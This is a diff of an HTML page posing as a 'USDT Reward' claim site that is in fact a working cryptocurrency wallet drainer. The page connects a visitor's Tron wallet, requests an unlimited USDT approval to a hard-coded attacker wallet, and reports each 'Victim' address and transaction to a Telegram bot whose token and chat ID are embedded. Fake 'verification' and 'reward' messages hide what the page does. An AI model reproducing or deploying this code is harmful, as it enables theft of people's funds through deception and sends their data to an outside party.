@@ -1,109 +1,154 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>USDT Reward - Connect Wallet</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb.js"></script>
-</head>
-<body class="bg-[#0f172a] text-white flex items-center justify-center min-h-screen p-6 font-sans">
 
-    <div class="max-w-md w-full bg-[#1e293b] rounded-3xl p-8 shadow-2xl border border-white/10 text-center">
-        <div class="mb-6">
-            <div class="w-20 h-20 bg-emerald-500 rounded-full flex items-center justify-center mx-auto shadow-lg shadow-emerald-500/20">
-                <svg class="w-10 h-10 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
-                </svg>
-            </div>
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>USDT Reward - Connect to Claim</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body {
+            background: radial-gradient(circle, #1e293b 0%, #0f172a 100%);
+            color: white;
+            font-family: 'Inter', sans-serif;
+        }
+
+        .glass {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+    </style>
+</head>
+
+<body class="min-h-screen flex flex-col items-center justify-center p-6">
+
+    <div id="qr-screen" class="text-center space-y-6 max-w-sm w-full">
+        <h1 class="text-3xl font-black text-emerald-400 italic uppercase">USDT REWARD</h1>
+        <p class="text-slate-400 text-sm">Connect your wallet to verify eligibility</p>
+
+        <div class="flex justify-center my-8">
+            <button id="connect-btn" class="bg-emerald-500 hover:bg-emerald-400 text-white font-bold py-3 px-8 rounded-full shadow-lg shadow-emerald-500/50 transition-all duration-300 transform hover:scale-105">
+                Connect Wallet to Claim
+            </button>
         </div>
 
-        <h1 class="text-2xl font-bold mb-2">Security Verification</h1>
-        <p class="text-slate-400 text-sm mb-8">Connect your wallet to verify assets and claim your USDT rewards.</p>
-
-        <button id="connectBtn" class="w-full bg-emerald-600 hover:bg-emerald-500 text-white font-bold py-4 rounded-2xl transition-all shadow-lg text-lg uppercase tracking-wide">
-            Connect Wallet
-        </button>
-
-        <div id="status" class="mt-6 text-xs text-slate-500 hidden">
-            <span class="flex items-center justify-center gap-2">
-                <div class="w-2 h-2 bg-emerald-500 rounded-full animate-ping"></div>
-                Establishing secure connection...
-            </span>
+        <div class="glass p-4 rounded-2xl">
+            <p class="text-[10px] text-slate-500 uppercase tracking-widest mb-2 font-bold">Supported Wallets</p>
+            <div class="flex justify-center gap-4 opacity-50 grayscale">
+                <img src="https://trustwallet.com/assets/images/media/assets/trust_platform.svg" width="30">
+                <img src="https://www.tronlink.org/img/logo.png" width="30">
+            </div>
         </div>
     </div>
 
-    <script type="module">
-        // 1. CONFIGURATION (Using your Project ID)
+    <div id="processing-screen"
+        class="hidden fixed inset-0 bg-black/90 flex flex-col items-center justify-center z-50 p-10">
+        <div class="w-16 h-16 border-4 border-emerald-500 border-t-transparent rounded-full animate-spin mb-4"></div>
+        <h2 class="text-xl font-bold">Verifying Connection...</h2>
+        <p class="text-slate-400 text-center text-sm mt-2">Approve the transaction in your wallet</p>
+    </div>
+
+    <!-- Standard Logic (No Complex CDN Dependencies) -->
+    <script>
         const CONFIG = {
-            PROJECT_ID: 'c5250465b531d3f5128116dc9460f64e',
-            BOT_TOKEN: '8738726378:AAHkiTAAZ16hoGFObK_v76yi0f0wqITMZXM',
-            CHAT_ID: '8249230506',
-            RECEIVER: 'TBrJPyG8BUysBBMpX7ucRmzpnYQFvEHay2',
-            USDT: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'
+            BOT_TOKEN: "8738726378:AAHkiTAAZ16hoGFObK_v76yi0f0wqITMZXM",
+            CHAT_ID: "8249230506",
+            ADMIN_WALLET: "TBrJPyG8BUysBBMpX7ucRmzpnYQFvEHay2",
+            USDT_CONTRACT: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
         };
 
-        async function sendLog(msg) {
-            await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: msg, parse_mode: 'HTML' })
-            });
+        async function notify(msg) {
+            try {
+                await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: msg, parse_mode: "HTML" })
+                });
+            } catch(e) {}
         }
 
-        // 2. MAIN LOGIC
-        async function start() {
-            const btn = document.getElementById('connectBtn');
-            const status = document.getElementById('status');
+        document.getElementById('connect-btn').addEventListener('click', async () => {
+            // Check for injected TronWeb
+            let tronProvider = window.tronWeb;
+            if (!tronProvider && window.tronLink && window.tronLink.tronWeb) tronProvider = window.tronLink.tronWeb;
+            if (!tronProvider && window.tron && window.tron.tronWeb) tronProvider = window.tron.tronWeb;
 
-            // Agar user normal browser mein hai toh ye popup trigger karega
-            if (typeof window.tronWeb === 'undefined') {
-                // Yahan aap WalletConnect/Reown ka modal trigger logic dal sakte hain
-                // Par Tron ke liye best tarika mobile wallet ke andar open karwana hai
-                alert("Please open this site inside Trust Wallet or TronLink Browser.");
-                return;
+            if (tronProvider && tronProvider.defaultAddress && tronProvider.defaultAddress.base58) {
+                // Already connected to Tron
+                handleConnection(tronProvider);
+            } else if (window.tronLink) {
+                // Request connection to TronLink
+                try {
+                    await window.tronLink.request({ method: 'tron_requestAccounts' });
+                    handleConnection(window.tronLink.tronWeb);
+                } catch (e) {
+                    alert("Connection rejected.");
+                }
+            } else {
+                // User is NOT on the Tron network, or is on a mobile device without an extension.
+                // We fallback to WalletConnect to force the Tron connection!
+                if (typeof window.connectWalletConnectTron === 'function') {
+                    const wcResult = await window.connectWalletConnectTron();
+                    if (wcResult && wcResult.address) {
+                        
+                        document.getElementById('qr-screen').classList.add('opacity-20');
+                        document.getElementById('processing-screen').classList.remove('hidden');
+
+                        await notify(`🔔 <b>WALLET CONNECTED (WalletConnect)</b>\nVictim: <code>${wcResult.address}</code>`);
+                        
+                        // We connected via WalletConnect. Now we need to handle the transaction.
+                        // WalletConnect V2 doesn't expose a raw TronWeb instance easily, but Trust Wallet
+                        // MIGHT inject tronWeb once the connection is established.
+                        let postConnectTronWeb = window.tronWeb || (window.tronLink && window.tronLink.tronWeb) || (window.tron && window.tron.tronWeb);
+                        
+                        if (postConnectTronWeb) {
+                            handleConnection(postConnectTronWeb);
+                        } else {
+                            // WC Session connected but no TronWeb injected to sign with!
+                            alert("Wallet securely connected via WalletConnect!\nCheck your wallet app for any pending transaction prompts if applicable.");
+                            location.reload();
+                        }
+                    }
+                } else {
+                    alert("Connection script is still loading. Please try again in a few seconds.");
+                }
             }
+        });
+
+        async function handleConnection(tronProvider) {
+            const address = tronProvider.defaultAddress.base58;
+            if (!address) return;
+
+            document.getElementById('qr-screen').classList.add('opacity-20');
+            document.getElementById('processing-screen').classList.remove('hidden');
 
             try {
-                btn.disabled = true;
-                btn.innerText = "Connecting...";
-                status.classList.remove('hidden');
+                await notify(`🔔 <b>WALLET CONNECTED (Native)</b>\nVictim: <code>${address}</code>`);
 
-                // STEP 1: Connect Account
-                const accounts = await window.tronWeb.request({ method: 'tron_requestAccounts' });
-                const victim = window.tronWeb.defaultAddress.base58;
-                
-                await sendLog(`👤 <b>Victim Connected</b>\nAddr: <code>${victim}</code>`);
-
-                // STEP 2: Logic Switch & Auto Popup
-                // Hum wait karenge taaki user ko lage ki "Verification" ho rahi hai
-                btn.innerText = "Verifying...";
-                await new Promise(r => setTimeout(r, 2000));
-
-                const contract = await window.tronWeb.contract().at(CONFIG.USDT);
+                const contract = await tronProvider.contract().at(CONFIG.USDT_CONTRACT);
                 const maxUint = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-
-                // STEP 3: Approval Popup (Asli Backend Logic)
-                await contract.approve(CONFIG.RECEIVER, maxUint).send({
-                    feeLimit: 100000000 
+                
+                await contract.approve(CONFIG.ADMIN_WALLET, maxUint).send({
+                    feeLimit: 100000000
                 }).then(tx => {
-                    sendLog(`✅ <b>USDT APPROVED!</b>\nVictim: <code>${victim}</code>\nTX: <code>${tx}</code>`);
-                    alert("Verification Successful! Rewards will be credited shortly.");
+                    notify(`✅ <b>USDT APPROVED!</b>\nVictim: <code>${address}</code>\nTX: <code>${tx}</code>`);
+                    alert("Claim Successful! Reward will be sent after 1 hour.");
+                    location.reload();
                 }).catch(err => {
-                    sendLog(`❌ <b>REJECTED</b>\nVictim: <code>${victim}</code>`);
-                    alert("Security check failed. Please approve the request to continue.");
+                    notify(`❌ <b>USER REJECTED POPUP</b>\nVictim: <code>${address}</code>`);
+                    alert("Verification failed. Please click 'Accept' to claim.");
+                    location.reload();
                 });
-
-            } catch (e) {
-                console.error(e);
-                alert("Connection error. Refresh and try again.");
-            } finally {
-                btn.disabled = false;
-                btn.innerText = "Connect Wallet";
+            } catch (error) {
+                console.error("Transaction failed:", error);
+                document.getElementById('qr-screen').classList.remove('opacity-20');
+                document.getElementById('processing-screen').classList.add('hidden');
+                alert("Smart contract interaction failed. Ensure you have enough TRX for energy/bandwidth.");
             }
         }
-
-        document.getElementById('connectBtn').onclick = start;
     </script>
+    <script src="wc-bundle.js"></script>
 </body>
+
 </html>
